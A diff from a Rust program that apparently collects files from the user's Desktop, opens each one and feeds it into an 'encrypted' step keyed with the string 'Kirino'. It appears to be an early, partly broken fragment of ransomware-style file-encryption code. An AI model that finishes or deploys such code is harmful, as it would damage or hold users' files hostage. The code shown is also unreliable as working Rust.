@@ -34,14 +34,26 @@ fn main() -> std::io::Result<()>{
         pathbuf.push(who_am_i);
         pathbuf.push("/Desktop");
 
-        let v_file_names= get_file_names(pathbuf.to_string()); // pathbuf to string
+        let string_pathbuf= match pathbuf.into_os_string().into_string(){
+            Ok(string) => string,
+            Err(os_string) => panic!("[failed] getting string_pathbuf"), 
+        }; 
+
+        let v_file_names= get_file_names(string_pathbuf.as_str())?;
         
         // keep encrypted string buff -> buff free;
         for file_name in v_file_names {
+            let mut pathbuf= PathBuf::from("C:/");
             let mut data_buff: Box<[u8; 1024]> = Box::new([0u8; 1024]);
+            
             pathbuf.push(file_name);
             
-            open_file(pathbuf.to_string());
+            let string_pathbuf= match pathbuf.into_os_string().into_string() {
+                Ok(string) => string,
+                Err(os_string) => panic!("[failed] getting string_pathbuf"), 
+            };
+
+            let file= File::open(string_pathbuf)?;
             
             let encrypted= encrypted.offset("Kirino");
 
